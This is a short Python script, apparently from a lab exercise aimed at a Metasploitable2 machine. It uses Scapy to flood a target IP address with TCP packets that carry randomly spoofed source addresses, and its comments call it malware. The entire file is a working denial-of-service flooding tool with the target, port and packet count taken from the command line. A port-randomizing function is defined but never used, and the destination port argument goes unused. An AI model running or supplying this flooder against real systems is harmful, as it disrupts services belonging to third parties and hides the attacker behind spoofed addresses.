import sys
# Importing Scapy libraries to our project/malware
from scapy.all import *

# To generate random IP address for our SYN packet to be send to the server/target machine
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

# To generate random Port number for our SYN packet to be send to the server/target machine
def randPort():
	x = random.randint(0, 64000)
	return x

# argument for destination ip address given in the command 
# line and in this case the metasploitable2 inet address
dest_ip_address = sys.argv[1]

# argument for port number given in the command line
dest_port = int(sys.argv[2])

# number of packet to be send to flood the target machine
pkt_count = int(sys.argv[3])

# for loop to keep sending the packets until the given argument is met
for i in range(0, pkt_count):

	# assigning source ip address to a random ip address generated with the randomIP function
	src_ip = randomIP()
	
	# constructing the packet by using the source ip and destination ip
	packet = IP(src=str(src_ip), dst=dest_ip_address)

	# assigning the type of protocol to be send in the packet (in this case TCP)
	pkt = packet/TCP()

	# send the packet
	send(pkt)
